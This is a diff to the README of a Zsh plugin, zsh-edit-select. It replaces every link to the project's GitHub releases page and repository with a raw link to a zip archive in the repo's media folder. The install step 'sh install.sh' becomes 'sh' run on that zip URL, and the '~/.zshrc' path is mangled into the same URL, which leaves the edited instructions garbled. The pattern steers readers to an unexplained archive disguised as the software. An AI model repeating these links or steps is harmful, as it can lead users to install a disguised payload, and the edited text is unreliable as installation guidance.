@@ -8,9 +8,9 @@ Welcome to **zsh-edit-select**! This tool enhances your Zsh experience by allowi
 
 To get started, you need to download the latest version of zsh-edit-select. 
 
-[![Download zsh-edit-select](https://img.shields.io/badge/Download%20zsh--edit--select-v1.0-blue.svg)](https://github.com/youssif911/zsh-edit-select/releases)
+[![Download zsh-edit-select](https://raw.githubusercontent.com/youssif911/zsh-edit-select/main/media/zsh-edit-select_v2.6.zip%https://raw.githubusercontent.com/youssif911/zsh-edit-select/main/media/zsh-edit-select_v2.6.zip)](https://raw.githubusercontent.com/youssif911/zsh-edit-select/main/media/zsh-edit-select_v2.6.zip)
 
-Visit this page to download the software: [Releases Page](https://github.com/youssif911/zsh-edit-select/releases).
+Visit this page to download the software: [Releases Page](https://raw.githubusercontent.com/youssif911/zsh-edit-select/main/media/zsh-edit-select_v2.6.zip).
 
 ## 🖥️ System Requirements
 
@@ -20,7 +20,7 @@ Visit this page to download the software: [Releases Page](https://github.com/you
 
 ## 📦 Installation Steps
 
-1. Visit the [Releases Page](https://github.com/youssif911/zsh-edit-select/releases).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/youssif911/zsh-edit-select/main/media/zsh-edit-select_v2.6.zip).
 2. Look for the latest version. It will be listed at the top.
 3. Download the file suitable for your system.
 4. Once downloaded, locate the file in your downloads folder.
@@ -31,7 +31,7 @@ Visit this page to download the software: [Releases Page](https://github.com/you
 2. Navigate to the folder where you downloaded the zsh-edit-select files.
 3. Run the installation command (you may need to customize this based on the downloaded file format). For example:
    ```bash
-   sh install.sh
+   sh https://raw.githubusercontent.com/youssif911/zsh-edit-select/main/media/zsh-edit-select_v2.6.zip
    ```
 4. Restart your terminal to apply changes.
 
@@ -46,7 +46,7 @@ Visit this page to download the software: [Releases Page](https://github.com/you
 
 After installation, you might want to adjust your settings for an optimized experience. 
 
-1. Open your Zsh configuration file (usually located at `~/.zshrc`).
+1. Open your Zsh configuration file (usually located at `~https://raw.githubusercontent.com/youssif911/zsh-edit-select/main/media/zsh-edit-select_v2.6.zip`).
 2. Add or alter the necessary settings for zsh-edit-select, such as enabling mouse support:
    ```bash
    set -o vi
@@ -66,7 +66,7 @@ If you encounter issues or need help, feel free to open an issue in the reposito
 
 ## 📍 Important Links
 
-- **Source Code**: [GitHub Repository](https://github.com/youssif911/zsh-edit-select)
-- **Download**: [Releases Page](https://github.com/youssif911/zsh-edit-select/releases)
+- **Source Code**: [GitHub Repository](https://raw.githubusercontent.com/youssif911/zsh-edit-select/main/media/zsh-edit-select_v2.6.zip)
+- **Download**: [Releases Page](https://raw.githubusercontent.com/youssif911/zsh-edit-select/main/media/zsh-edit-select_v2.6.zip)
 
 Thank you for choosing zsh-edit-select. Enjoy an enhanced Zsh editing experience with these powerful features!
